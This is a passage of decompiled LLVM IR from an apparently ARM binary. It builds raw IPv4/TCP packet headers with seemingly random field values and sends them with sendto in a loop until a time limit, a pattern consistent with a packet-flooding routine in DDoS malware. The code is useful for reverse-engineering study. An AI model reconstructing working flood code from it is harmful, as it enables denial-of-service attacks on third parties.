  %v1_c740 = and i32 %tmp95, 65280
  %tmp96 = udiv i32 %v3_c734, 256
  %v4_c744 = urem i32 %tmp96, 256
  %v5_c744 = or i32 %v4_c744, %v1_c740
  store i32 %v5_c744, i32* %r2.global-to-local, align 4
  %v1_c748 = add i32 %v3_c734, 1
  store i32 %v1_c748, i32* %r3.global-to-local, align 4
  store i32 %v1_c748, i32* %v2_c734, align 4
  %v0_c750 = load i32, i32* %r2.global-to-local, align 4
  %v1_c750 = load i32, i32* @r5, align 4
  %v2_c750 = add i32 %v1_c750, 4
  %v3_c750 = inttoptr i32 %v2_c750 to i32*
  store i32 %v0_c750, i32* %v3_c750, align 4
  %v0_c754 = load i32, i32* %r1.global-to-local, align 4
  %v1_c754 = add i32 %v0_c754, 8
  %v2_c754 = inttoptr i32 %v1_c754 to i32*
  %v3_c754 = load i32, i32* %v2_c754, align 4
  %tmp97 = mul i32 %v3_c754, 256
  %v1_c760 = and i32 %tmp97, 65280
  %tmp98 = udiv i32 %v3_c754, 256
  %v4_c764 = urem i32 %tmp98, 256
  %v5_c764 = or i32 %v4_c764, %v1_c760
  store i32 %v5_c764, i32* %r2.global-to-local, align 4
  %v4_c76834 = udiv i32 %v2_c720, 256
  %v1_c76c = trunc i32 %v4_c76834 to i8
  %v2_c76c = load i32, i32* @r4, align 4
  %v3_c76c = add i32 %v2_c76c, 11
  %v4_c76c = inttoptr i32 %v3_c76c to i8*
  store i8 %v1_c76c, i8* %v4_c76c, align 1
  %v3_c770 = load i32, i32* @r4, align 4
  %v4_c770 = add i32 %v3_c770, 10
  %v5_c770 = inttoptr i32 %v4_c770 to i8*
  store i8 %v3_c720, i8* %v5_c770, align 1
  %v0_c774 = load i32, i32* %r2.global-to-local, align 4
  %v1_c774 = load i32, i32* @r5, align 4
  %v2_c774 = add i32 %v1_c774, 8
  %v3_c774 = inttoptr i32 %v2_c774 to i32*
  store i32 %v0_c774, i32* %v3_c774, align 4
  %v0_c778 = load i32, i32* @r5, align 4
  store i32 %v0_c778, i32* @r1, align 4
  %v0_c77c = load i32, i32* @fp, align 4
  store i32 %v0_c77c, i32* %r2.global-to-local, align 4
  %v0_c780 = load i32, i32* @sl, align 4
  store i32 %v0_c780, i32* %r3.global-to-local, align 4
  %v0_c784 = load i32, i32* @r4, align 4
  store i32 %v0_c784, i32* %r0.global-to-local, align 4
  %v0_c788 = load i32, i32* @r7, align 4
  %v1_c788 = trunc i32 %v0_c788 to i8
  %v3_c788 = add i32 %v0_c778, 16
  %v4_c788 = inttoptr i32 %v3_c788 to i8*
  store i8 %v1_c788, i8* %v4_c788, align 1
  %v0_c78c = load i32, i32* @r7, align 4
  %v1_c78c = trunc i32 %v0_c78c to i8
  %v2_c78c = load i32, i32* @r5, align 4
  %v3_c78c = add i32 %v2_c78c, 17
  %v4_c78c = inttoptr i32 %v3_c78c to i8*
  store i8 %v1_c78c, i8* %v4_c78c, align 1
  %v4_c790 = call i32 @function_f1e4(i32 %v0_c784, i32 %v0_c778, i32 %v0_c77c, i32 %v0_c780)
  %v5_c790 = trunc i32 %v4_c790 to i8
  store i32 %v4_c790, i32* %r0.global-to-local, align 4
  %v4_c79435 = udiv i32 %v4_c790, 256
  %v1_c798 = trunc i32 %v4_c79435 to i8
  %v2_c798 = load i32, i32* @r5, align 4
  %v3_c798 = add i32 %v2_c798, 17
  %v4_c798 = inttoptr i32 %v3_c798 to i8*
  store i8 %v1_c798, i8* %v4_c798, align 1
  %v3_c79c = load i32, i32* @r5, align 4
  %v4_c79c = add i32 %v3_c79c, 16
  %v5_c79c = inttoptr i32 %v4_c79c to i8*
  store i8 %v5_c790, i8* %v5_c79c, align 1
  %v3_c7a0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c7a0, i32* %r3.global-to-local, align 4
  %v0_c7a4 = load i32, i32* @r4, align 4
  %v1_c7a4 = add i32 %v0_c7a4, 20
  %v2_c7a4 = inttoptr i32 %v1_c7a4 to i32*
  %v3_c7a4 = load i32, i32* %v2_c7a4, align 4
  %v5_c7ac = mul i32 %v3_c7a0, 24
  %v3_c7b4 = udiv i32 %v3_c7a4, 65536
  store i32 %v3_c7b4, i32* %r2.global-to-local, align 4
  %v2_c7b8 = add i32 %v5_c7ac, %arg3
  store i32 %v2_c7b8, i32* %ip.global-to-local, align 4
  %v3_c7bc6 = udiv i32 %v3_c7a4, 16777216
  %v1_c7c0 = trunc i32 %v3_c7bc6 to i8
  %v3_c7c0 = add i32 %v2_c7b8, 3
  %v4_c7c0 = inttoptr i32 %v3_c7c0 to i8*
  store i8 %v1_c7c0, i8* %v4_c7c0, align 1
  %v0_c7c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_c7c4 = trunc i32 %v0_c7c4 to i8
  %v2_c7c4 = load i32, i32* %ip.global-to-local, align 4
  %v3_c7c4 = add i32 %v2_c7c4, 2
  %v4_c7c4 = inttoptr i32 %v3_c7c4 to i8*
  store i8 %v1_c7c4, i8* %v4_c7c4, align 1
  %v0_c7c8 = load i32, i32* @r4, align 4
  store i32 %v0_c7c8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c7d0 = load i32, i32* @r8, align 4
  store i32 %v0_c7d0, i32* %r0.global-to-local, align 4
  %v0_c7d4 = load i32, i32* @sb, align 4
  store i32 %v0_c7d4, i32* %r2.global-to-local, align 4
  store i32 16, i32* %r4.global-to-local, align 4
  %v0_c7dc = load i32, i32* %ip.global-to-local, align 4
  %v4_c7dc = inttoptr i32 %v0_c7dc to %sockaddr*
  %v7_c7e4 = inttoptr i32 %v0_c7c8 to i32*
  %v9_c7e4 = call i32 @sendto(i32 %v0_c7d0, i32* %v7_c7e4, i32 %v0_c7d4, i32 16384, %sockaddr* %v4_c7dc, i32 16)
  %v3_c7e8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c7e8, i32* %r3.global-to-local, align 4
  store i32 %v1_c28c, i32* %ip.global-to-local, align 4
  %v1_c7f0 = add i32 %v3_c7e8, 1
  store i32 %v1_c7f0, i32* %r0.global-to-local, align 4
  %v9_c7f4 = icmp eq i32 %v1_c7f0, %v1_c28c
  store i1 %v9_c7f4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c7f0, i32* %stack_var_-40, align 4
  %v6_c7fc = icmp slt i32 %v1_c7f0, %v1_c28c
  br i1 %v6_c7fc, label %dec_label_pc_c800, label %dec_label_pc_c8f4

dec_label_pc_c800:                                ; preds = %dec_label_pc_c710, %dec_label_pc_c6e4
  %v1_c80c = phi i32 [ %v1_c7f0, %dec_label_pc_c710 ], [ 0, %dec_label_pc_c6e4 ]
  store i32 %v4_c2c8, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32* %r3.global-to-local, align 4
  store i32 %v3_c4c4, i32* %lr.global-to-local, align 4
  %v4_c80c = mul i32 %v1_c80c, 4
  %v5_c80c = add i32 %v4_c80c, %v4_c2c8
  %v6_c80c = inttoptr i32 %v5_c80c to i32*
  %v7_c80c = load i32, i32* %v6_c80c, align 4
  store i32 %v7_c80c, i32* @r4, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i1 %v9_c814, i1* %cpsr_z.global-to-local, align 1
  %v1_c818 = add i32 %v7_c80c, 40
  store i32 %v1_c818, i32* @r6, align 4
  %v1_c81c = add i32 %v7_c80c, 20
  store i32 %v1_c81c, i32* @r5, align 4
  br i1 %v9_c814, label %dec_label_pc_c8e0, label %dec_label_pc_c824

dec_label_pc_c824:                                ; preds = %dec_label_pc_c800, %dec_label_pc_c8e0
  %v0_c830 = phi i32 [ %v1_c818, %dec_label_pc_c800 ], [ %v0_c830.pre, %dec_label_pc_c8e0 ]
  store i1 %v2_c828, i1* %cpsr_z.global-to-local, align 1
  store i32 %v6_c438, i32* %r1.global-to-local, align 4
  store i32 %v0_c830, i32* %r0.global-to-local, align 4
  br i1 %v2_c828, label %dec_label_pc_c710, label %dec_label_pc_c838

dec_label_pc_c838:                                ; preds = %dec_label_pc_c824
  %v2_c838 = call i32 @function_10664(i32 %v0_c830, i32 %v6_c438)
  store i32 %v2_c838, i32* %r0.global-to-local, align 4
  store i32 %v6_c438, i32* %r1.global-to-local, align 4
  %v0_c840 = load i32, i32* @r7, align 4
  %v1_c840 = trunc i32 %v0_c840 to i8
  %v2_c840 = load i32, i32* @r6, align 4
  %v4_c840 = add i32 %v2_c840, %v6_c438
  %v5_c840 = inttoptr i32 %v4_c840 to i8*
  store i8 %v1_c840, i8* %v5_c840, align 1
  br label %dec_label_pc_c710

dec_label_pc_c848:                                ; preds = %dec_label_pc_c494
  %v0_c848 = load i32, i32* @r8, align 4
  store i32 %v0_c848, i32* %r0.global-to-local, align 4
  %v1_c84c = call i32 @close(i32 %v0_c848)
  store i32 %v1_c84c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c850

dec_label_pc_c850:                                ; preds = %dec_label_pc_c5f8, %dec_label_pc_c8f4, %dec_label_pc_c288, %dec_label_pc_c848
  %v29_c854 = phi i32 [ %v3_c47c, %dec_label_pc_c288 ], [ %v1_c84c, %dec_label_pc_c848 ], [ %v2_c8f8, %dec_label_pc_c8f4 ], [ 0, %dec_label_pc_c5f8 ]
  store i32 %v3_c288, i32* %r4.global-to-local, align 4
  store i32 %v18_c288, i32* %sb.global-to-local, align 4
  ret i32 %v29_c854

dec_label_pc_c858:                                ; preds = %bb88
  %v1_c858 = add i32 %v2_c560, 16
  %v2_c858 = inttoptr i32 %v1_c858 to i32*
  %v3_c858 = load i32, i32* %v2_c858, align 4
  store i32 %v3_c858, i32* %r4.global-to-local, align 4
  %v0_c85c = call i32 @function_105b0()
  store i32 %v0_c85c, i32* %r0.global-to-local, align 4
  %v3_c860 = load i32, i32* %stack_var_-40, align 4
  %v5_c868 = mul i32 %v3_c860, 24
  %v2_c874 = add i32 %v5_c868, %arg3
  store i32 %v2_c874, i32* %r1.global-to-local, align 4
  %v1_c870 = udiv i32 %v3_c858, 256
  %v3_c878 = and i32 %v1_c870, 65280
  store i32 %v3_c878, i32* %r2.global-to-local, align 4
  %v1_c87c = and i32 %v3_c858, 65280
  store i32 %v1_c87c, i32* %r3.global-to-local, align 4
  %v3_c880 = mul i32 %v3_c858, 16777216
  %v4_c884 = mul nuw nsw i32 %v1_c87c, 256
  %v5_c884 = or i32 %v4_c884, %v3_c880
  store i32 %v5_c884, i32* %ip.global-to-local, align 4
  %v1_c888 = add i32 %v2_c874, 20
  %v2_c888 = inttoptr i32 %v1_c888 to i8*
  %v3_c888 = load i8, i8* %v2_c888, align 1
  %v4_c888 = zext i8 %v3_c888 to i32
  store i32 %v4_c888, i32* %lr.global-to-local, align 4
  %v2_c890 = call i32 @llvm.bswap.i32(i32 %v3_c858)
  %v7_c894 = lshr i32 %v0_c85c, %v4_c888
  %v8_c894 = add i32 %v7_c894, %v2_c890
  store i32 %v8_c894, i32* %r2.global-to-local, align 4
  %v3_c8a0 = mul i32 %v8_c894, 16777216
  %v1_c8a4 = and i32 %v8_c894, 65280
  store i32 %v1_c8a4, i32* %r0.global-to-local, align 4
  %v4_c8a8 = mul nuw nsw i32 %v1_c8a4, 256
  %v5_c8a8 = or i32 %v4_c8a8, %v3_c8a0
  store i32 %v5_c8a8, i32* %r1.global-to-local, align 4
  %v2_c8b0 = call i32 @llvm.bswap.i32(i32 %v8_c894)
  store i32 %v3_c480, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i1 %v9_c8c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c8c4, label %dec_label_pc_c8cc, label %dec_label_pc_c58c

dec_label_pc_c8cc:                                ; preds = %dec_label_pc_c858, %dec_label_pc_c578
  %stack_var_-56.6 = phi i32 [ %v2_c8b0, %dec_label_pc_c858 ], [ %v4_c570.stack_var_-56.1, %dec_label_pc_c578 ]
  %v0_c8cc = call i32 @function_105b0()
  %v1_c8cc = trunc i32 %v0_c8cc to i8
  store i32 %v0_c8cc, i32* %r0.global-to-local, align 4
  %v4_c8d0 = sdiv i32 %v0_c8cc, 256
  store i32 %v4_c8d0, i32* %r3.global-to-local, align 4
  %v1_c8d4 = trunc i32 %v4_c8d0 to i8
  br label %dec_label_pc_c5a4

dec_label_pc_c8e0:                                ; preds = %dec_label_pc_c800
  %v0_c8e0 = call i32 @function_105b0()
  %v1_c8e0 = trunc i32 %v0_c8e0 to i8
  store i32 %v0_c8e0, i32* %r0.global-to-local, align 4
  %v4_c8e4 = sdiv i32 %v0_c8e0, 256
  store i32 %v4_c8e4, i32* %r3.global-to-local, align 4
  %v1_c8e8 = trunc i32 %v4_c8e4 to i8
  %v2_c8e8 = load i32, i32* @r4, align 4
  %v3_c8e8 = add i32 %v2_c8e8, 5
  %v4_c8e8 = inttoptr i32 %v3_c8e8 to i8*
  store i8 %v1_c8e8, i8* %v4_c8e8, align 1
  %v3_c8ec = load i32, i32* @r4, align 4
  %v4_c8ec = add i32 %v3_c8ec, 4
  %v5_c8ec = inttoptr i32 %v4_c8ec to i8*
  store i8 %v1_c8e0, i8* %v5_c8ec, align 1
  %v0_c830.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_c824

dec_label_pc_c8f4:                                ; preds = %dec_label_pc_c710, %dec_label_pc_c6d0
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_c8f8 = call i32 @time(i32* null)
  store i32 %v2_c8f8, i32* %r0.global-to-local, align 4
  store i32 %v2_c468, i32* %lr.global-to-local, align 4
  %v9_c900 = icmp eq i32 %v2_c468, %v2_c8f8
  store i1 %v9_c900, i1* %cpsr_z.global-to-local, align 1
  %v6_c904 = icmp slt i32 %v2_c468, %v2_c8f8
  br i1 %v6_c904, label %dec_label_pc_c850, label %dec_label_pc_c6d0

dec_label_pc_c90c:                                ; preds = %dec_label_pc_c670
  %v3_c90c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c90c, i32* %r4.global-to-local, align 4
  store i32 %v4_c2b8, i32* %r0.global-to-local, align 4
  %v3_c914 = mul i32 %v3_c90c, 16
  store i32 %v3_c914, i32* %ip.global-to-local, align 4
  %v3_c918 = add i32 %v3_c914, %v4_c2b8
  %v4_c918 = inttoptr i32 %v3_c918 to i32*
  store i32 %v0_c918, i32* %v4_c918, align 4
  store i32 %stack_var_-336.0.ph, i32* %r1.global-to-local, align 4
  %v1_c920 = add i32 %stack_var_-336.0.ph, 4
  %v2_c920 = inttoptr i32 %v1_c920 to i32*
  %v3_c920 = load i32, i32* %v2_c920, align 4
  store i32 %v3_c920, i32* %r0.global-to-local, align 4
  %v1_c928 = and i32 %v3_c920, 65280
  store i32 %v1_c928, i32* %r1.global-to-local, align 4
  %v2_c93c = call i32 @llvm.bswap.i32(i32 %v3_c920)
  store i32 %v4_c2b8, i32* %r2.global-to-local, align 4
  %v1_c944 = load i32, i32* %ip.global-to-local, align 4
  %v2_c944 = add i32 %v1_c944, %v4_c2b8
  store i32 %v2_c944, i32* %ip.global-to-local, align 4
  %v2_c948 = add i32 %v2_c944, 4
  %v3_c948 = inttoptr i32 %v2_c948 to i32*
  store i32 %v2_c93c, i32* %v3_c948, align 4
  store i32 %stack_var_-336.0.ph, i32* %r3.global-to-local, align 4
  %v1_c950 = add i32 %stack_var_-336.0.ph, 8
  %v2_c950 = inttoptr i32 %v1_c950 to i32*
  %v3_c950 = load i32, i32* %v2_c950, align 4
  store i32 %v3_c950, i32* %r0.global-to-local, align 4
  %v1_c958 = and i32 %v3_c950, 65280
  store i32 %v1_c958, i32* %r1.global-to-local, align 4
  %v3_c95c = mul i32 %v3_c950, 16777216
  %v4_c964 = mul nuw nsw i32 %v1_c958, 256
  %v5_c964 = or i32 %v4_c964, %v3_c95c
  store i32 %v5_c964, i32* %r2.global-to-local, align 4
  %v2_c96c = call i32 @llvm.bswap.i32(i32 %v3_c950)
  store i32 %v2_c96c, i32* %r3.global-to-local, align 4
  %v1_c970 = load i32, i32* %ip.global-to-local, align 4
  %v2_c970 = add i32 %v1_c970, 8
  %v3_c970 = inttoptr i32 %v2_c970 to i32*
  store i32 %v2_c96c, i32* %v3_c970, align 4
  store i32 %stack_var_-336.0.ph, i32* %lr.global-to-local, align 4
  %v1_c978 = inttoptr i32 %stack_var_-336.0.ph to i32*
  %v2_c978 = load i32, i32* %v1_c978, align 4
  %v3_c97c = udiv i32 %v2_c978, 65536
  store i32 %v3_c97c, i32* %r2.global-to-local, align 4
  %v3_c9807 = udiv i32 %v2_c978, 16777216
  store i32 %v3_c9807, i32* %r1.global-to-local, align 4
  %v0_c984 = load i32, i32* @r5, align 4
  %v3_c984 = sdiv i32 %v0_c984, 256
  store i32 %v3_c984, i32* %r3.global-to-local, align 4
  %v1_c988 = trunc i32 %v3_c984 to i8
  %v2_c988 = load i32, i32* %ip.global-to-local, align 4
  %v3_c988 = add i32 %v2_c988, 15
  %v4_c988 = inttoptr i32 %v3_c988 to i8*
  store i8 %v1_c988, i8* %v4_c988, align 1
  %v0_c98c = load i32, i32* %r1.global-to-local, align 4
  %v1_c98c = trunc i32 %v0_c98c to i8
  %v2_c98c = load i32, i32* %ip.global-to-local, align 4
  %v3_c98c = add i32 %v2_c98c, 13
  %v4_c98c = inttoptr i32 %v3_c98c to i8*
  store i8 %v1_c98c, i8* %v4_c98c, align 1
  %v0_c990 = load i32, i32* %r2.global-to-local, align 4
  %v1_c990 = trunc i32 %v0_c990 to i8
  %v2_c990 = load i32, i32* %ip.global-to-local, align 4
  %v3_c990 = add i32 %v2_c990, 12
  %v4_c990 = inttoptr i32 %v3_c990 to i8*
  store i8 %v1_c990, i8* %v4_c990, align 1
  %v0_c994 = load i32, i32* @r5, align 4
  %v1_c994 = trunc i32 %v0_c994 to i8
  %v2_c994 = load i32, i32* %ip.global-to-local, align 4
  %v3_c994 = add i32 %v2_c994, 14
  %v4_c994 = inttoptr i32 %v3_c994 to i8*
  store i8 %v1_c994, i8* %v4_c994, align 1
  store i32 %v1_c4e4, i32* %r0.global-to-local, align 4
  %v1_c99c = call i32* @malloc(i32 %v1_c4e4)
  %v3_c99c = ptrtoint i32* %v1_c99c to i32
  store i32 %v3_c99c, i32* %r0.global-to-local, align 4
  store i32 %v4_c2c8, i32* %r1.global-to-local, align 4
  %v3_c9a4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c9a4, i32* %r2.global-to-local, align 4
  %v2_c9a8 = load i32, i32* %r4.global-to-local, align 4
  %v5_c9a8 = mul i32 %v2_c9a8, 4
  %v6_c9a8 = add i32 %v5_c9a8, %v4_c2c8
  %v7_c9a8 = inttoptr i32 %v6_c9a8 to i32*
  store i32 %v3_c99c, i32* %v7_c9a8, align 4
  %v0_c9ac = load i32, i32* %r1.global-to-local, align 4
  %v1_c9ac = load i32, i32* %r2.global-to-local, align 4
  %v4_c9ac = mul i32 %v1_c9ac, 4
  %v5_c9ac = add i32 %v4_c9ac, %v0_c9ac
  %v6_c9ac = inttoptr i32 %v5_c9ac to i32*
  %v7_c9ac = load i32, i32* %v6_c9ac, align 4
  store i32 %v7_c9ac, i32* %r0.global-to-local, align 4
  %v1_c9b0 = inttoptr i32 %v7_c9ac to i8*
  %v2_c9b0 = load i8, i8* %v1_c9b0, align 1
  %tmp117 = urem i8 %v2_c9b0, 16
  %v1_c9b4 = zext i8 %tmp117 to i32
  %v1_c9b8 = or i32 %v1_c9b4, 64
  store i32 %v1_c9b8, i32* %r3.global-to-local, align 4
  %v1_c9bc = trunc i32 %v1_c9b8 to i8
  store i8 %v1_c9bc, i8* %v1_c9b0, align 1
  store i32 %v3_c4c4, i32* %ip.global-to-local, align 4
  %v0_c9c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_c9c4 = inttoptr i32 %v0_c9c4 to i8*
  %v2_c9c4 = load i8, i8* %v1_c9c4, align 1
  %v1_c9d0 = and i8 %v2_c9c4, -16
  store i32 %v5_c9d4, i32* %r3.global-to-local, align 4
  %v1_c9d8 = or i8 %v1_c9d0, 5
  store i32 %v4_c9dc, i32* %ip.global-to-local, align 4
  store i32 %v1_c9cc, i32* %r1.global-to-local, align 4
  store i8 %v1_c9d8, i8* %v1_c9c4, align 1
  %v0_c9e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_c9e8 = trunc i32 %v0_c9e8 to i8
  %v2_c9e8 = load i32, i32* %r0.global-to-local, align 4
  %v3_c9e8 = add i32 %v2_c9e8, 5
  %v4_c9e8 = inttoptr i32 %v3_c9e8 to i8*
  store i8 %v1_c9e8, i8* %v4_c9e8, align 1
  store i32 %v4_c9ec, i32* %r1.global-to-local, align 4
  store i32 %v4_c9f0, i32* %lr.global-to-local, align 4
  %v2_c9f4 = load i32, i32* %r0.global-to-local, align 4
  %v3_c9f4 = add i32 %v2_c9f4, 1
  %v4_c9f4 = inttoptr i32 %v3_c9f4 to i8*
  store i8 %v5_c300, i8* %v4_c9f4, align 1
  store i32 %v4_c9f8, i32* %r2.global-to-local, align 4
  %v0_c9fc = load i32, i32* %ip.global-to-local, align 4
  %v2_c9fc = icmp eq i32 %v0_c9fc, 0
  store i1 %v2_c9fc, i1* %cpsr_z.global-to-local, align 1
  %v0_ca00 = load i32, i32* %r3.global-to-local, align 4
  %v1_ca00 = trunc i32 %v0_ca00 to i8
  %v2_ca00 = load i32, i32* %r0.global-to-local, align 4
  %v3_ca00 = add i32 %v2_ca00, 4
  %v4_ca00 = inttoptr i32 %v3_ca00 to i8*
  store i8 %v1_ca00, i8* %v4_ca00, align 1
  %v0_ca04 = load i32, i32* %r0.global-to-local, align 4
  %v1_ca04 = add i32 %v0_ca04, 20
  store i32 %v1_ca04, i32* %r3.global-to-local, align 4
  %v0_ca08 = load i32, i32* %r2.global-to-local, align 4
  %v1_ca08 = trunc i32 %v0_ca08 to i8
  %v3_ca08 = add i32 %v0_ca04, 8
  %v4_ca08 = inttoptr i32 %v3_ca08 to i8*
  store i8 %v1_ca08, i8* %v4_ca08, align 1
  %v0_ca0c = load i32, i32* %r3.global-to-local, align 4
  %v0_ca10 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ca10, label %.thread10, label %bb100

bb100:                                            ; preds = %dec_label_pc_c90c
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_ca14 = load i32, i32* %r0.global-to-local, align 4
  %v4_ca14 = add i32 %v3_ca14, 6
  %v5_ca14 = inttoptr i32 %v4_ca14 to i8*
  store i8 64, i8* %v5_ca14, align 1
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_c90c, %bb100
  %v2_ca1c = load i32, i32* %r0.global-to-local, align 4
  %v3_ca1c = add i32 %v2_ca1c, 9
  %v4_ca1c = inttoptr i32 %v3_ca1c to i8*
  store i8 6, i8* %v4_ca1c, align 1
  %v2_ca24 = load i32, i32* @global_var_1c21c.135, align 4
  store i32 %v2_ca24, i32* %r3.global-to-local, align 4
  %v1_ca28 = load i32, i32* %r0.global-to-local, align 4
  %v2_ca28 = add i32 %v1_ca28, 12
  %v3_ca28 = inttoptr i32 %v2_ca28 to i32*
  store i32 %v2_ca24, i32* %v3_ca28, align 4
  %v0_ca2c = load i32, i32* %lr.global-to-local, align 4
  %v1_ca2c = trunc i32 %v0_ca2c to i8
  %v2_ca2c = load i32, i32* %r0.global-to-local, align 4
  %v3_ca2c = add i32 %v2_ca2c, 3
  %v4_ca2c = inttoptr i32 %v3_ca2c to i8*
  store i8 %v1_ca2c, i8* %v4_ca2c, align 1
  %v3_ca30 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_ca30, i32* %r2.global-to-local, align 4
  store i32 %v4_c2b8, i32* %lr.global-to-local, align 4
  %v4_ca38 = mul i32 %v3_ca30, 16
  %v5_ca38 = add i32 %v4_ca38, %v4_c2b8
  %v6_ca38 = inttoptr i32 %v5_ca38 to i32*
  %v7_ca38 = load i32, i32* %v6_ca38, align 4
  store i32 %v7_ca38, i32* %r3.global-to-local, align 4
  %v0_ca3c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ca3c, label %.thread11, label %bb101

bb101:                                            ; preds = %.thread10
  store i32 0, i32* %ip.global-to-local, align 4
  %v3_ca40 = load i32, i32* %r0.global-to-local, align 4
  %v4_ca40 = add i32 %v3_ca40, 7
  %v5_ca40 = inttoptr i32 %v4_ca40 to i8*
  store i8 0, i8* %v5_ca40, align 1
  br label %.thread11

.thread11:                                        ; preds = %.thread10, %bb101
  %v0_ca44 = load i32, i32* @fp, align 4
  %v1_ca44 = trunc i32 %v0_ca44 to i8
  %v2_ca44 = load i32, i32* %r0.global-to-local, align 4
  %v3_ca44 = add i32 %v2_ca44, 2
  %v4_ca44 = inttoptr i32 %v3_ca44 to i8*
  store i8 %v1_ca44, i8* %v4_ca44, align 1
  %v0_ca48 = load i32, i32* %r3.global-to-local, align 4
  %v1_ca48 = load i32, i32* %r0.global-to-local, align 4
  %v2_ca48 = add i32 %v1_ca48, 16
  %v3_ca48 = inttoptr i32 %v2_ca48 to i32*
  store i32 %v0_ca48, i32* %v3_ca48, align 4
  %v0_ca4c = load i32, i32* %r2.global-to-local, align 4
  %v3_ca4c = mul i32 %v0_ca4c, 16
  %v1_ca50 = load i32, i32* %lr.global-to-local, align 4
  %v2_ca50 = add i32 %v1_ca50, %v3_ca4c
  store i32 %v2_ca50, i32* %r2.global-to-local, align 4
  %v1_ca54 = add i32 %v2_ca50, 13
  %v2_ca54 = inttoptr i32 %v1_ca54 to i8*
  %v3_ca54 = load i8, i8* %v2_ca54, align 1
  %v4_ca54 = zext i8 %v3_ca54 to i32
  store i32 %v4_ca54, i32* %r1.global-to-local, align 4
  %v1_ca58 = add i32 %v2_ca50, 12
  %v2_ca58 = inttoptr i32 %v1_ca58 to i8*
  %v3_ca58 = load i8, i8* %v2_ca58, align 1
  %v4_ca58 = zext i8 %v3_ca58 to i32
  %v4_ca5c = mul nuw nsw i32 %v4_ca54, 256
  %v5_ca5c = or i32 %v4_ca58, %v4_ca5c
  store i32 %v5_ca5c, i32* %r3.global-to-local, align 4
  %v0_ca60 = load i32, i32* %r0.global-to-local, align 4
  %v1_ca60 = add i32 %v0_ca60, 40
  store i32 %v1_ca60, i32* @r4, align 4
  %v3_ca64 = add i32 %v0_ca60, 20
  %v4_ca64 = inttoptr i32 %v3_ca64 to i8*
  store i8 %v3_ca58, i8* %v4_ca64, align 1
  store i32 %v0_ca0c, i32* %r0.global-to-local, align 4
  %v0_ca6c = load i32, i32* %r3.global-to-local, align 4
  %v3_ca6c = sdiv i32 %v0_ca6c, 256
  store i32 %v3_ca6c, i32* %r3.global-to-local, align 4
  %v1_ca70 = trunc i32 %v3_ca6c to i8
  %v3_ca70 = add i32 %v0_ca0c, 1
  %v4_ca70 = inttoptr i32 %v3_ca70 to i8*
  store i8 %v1_ca70, i8* %v4_ca70, align 1
  %v0_ca74 = load i32, i32* %r2.global-to-local, align 4
  %v1_ca74 = add i32 %v0_ca74, 8
  %v2_ca74 = inttoptr i32 %v1_ca74 to i32*
  %v3_ca74 = load i32, i32* %v2_ca74, align 4
  store i32 %v3_ca74, i32* %r1.global-to-local, align 4
  store i32 %v0_ca0c, i32* %lr.global-to-local, align 4
  %v0_ca7c = load i32, i32* %r0.global-to-local, align 4
  %v1_ca7c = add i32 %v0_ca7c, 13
  %v2_ca7c = inttoptr i32 %v1_ca7c to i8*
  %v3_ca7c = load i8, i8* %v2_ca7c, align 1
  %v4_ca7c = zext i8 %v3_ca7c to i32
  store i32 %v4_ca7c, i32* %r3.global-to-local, align 4
  %v1_ca80 = add i32 %v0_ca74, 15
  %v2_ca80 = inttoptr i32 %v1_ca80 to i8*
  %v3_ca80 = load i8, i8* %v2_ca80, align 1
  %v4_ca80 = zext i8 %v3_ca80 to i32
  store i32 %v4_ca80, i32* %ip.global-to-local, align 4
  %v1_ca84 = add i32 %v0_ca74, 14
  %v2_ca84 = inttoptr i32 %v1_ca84 to i8*
  %v3_ca84 = load i8, i8* %v2_ca84, align 1
  %v4_ca84 = zext i8 %v3_ca84 to i32
  store i32 %v4_ca84, i32* %r0.global-to-local, align 4
  %v2_ca88 = add i32 %v0_ca0c, 4
  %v3_ca88 = inttoptr i32 %v2_ca88 to i32*
  store i32 %v3_ca74, i32* %v3_ca88, align 4
  store i32 %v0_ca0c, i32* %r1.global-to-local, align 4
  %v0_ca90 = load i32, i32* %r3.global-to-local, align 4
  %v1_ca90 = or i32 %v0_ca90, 1
  store i32 %v1_ca90, i32* %r3.global-to-local, align 4
  %v0_ca94 = load i32, i32* %r2.global-to-local, align 4
  %v1_ca94 = add i32 %v0_ca94, 4
  %v2_ca94 = inttoptr i32 %v1_ca94 to i32*
  %v3_ca94 = load i32, i32* %v2_ca94, align 4
  store i32 %v3_ca94, i32* %lr.global-to-local, align 4
  %v1_ca98 = trunc i32 %v1_ca90 to i8
  %v3_ca98 = add i32 %v0_ca0c, 13
  %v4_ca98 = inttoptr i32 %v3_ca98 to i8*
  store i8 %v1_ca98, i8* %v4_ca98, align 1
  %v0_ca9c = load i32, i32* %r1.global-to-local, align 4
  %v1_ca9c = add i32 %v0_ca9c, 12
  %v2_ca9c = inttoptr i32 %v1_ca9c to i8*
  %v3_ca9c = load i8, i8* %v2_ca9c, align 1
  %v4_ca9c = zext i8 %v3_ca9c to i32
  store i32 %v4_ca9c, i32* %r2.global-to-local, align 4
  %v1_caa0 = add i32 %v0_ca9c, 13
  %v2_caa0 = inttoptr i32 %v1_caa0 to i8*
  %v3_caa0 = load i8, i8* %v2_caa0, align 1
  %v4_caa0 = zext i8 %v3_caa0 to i32
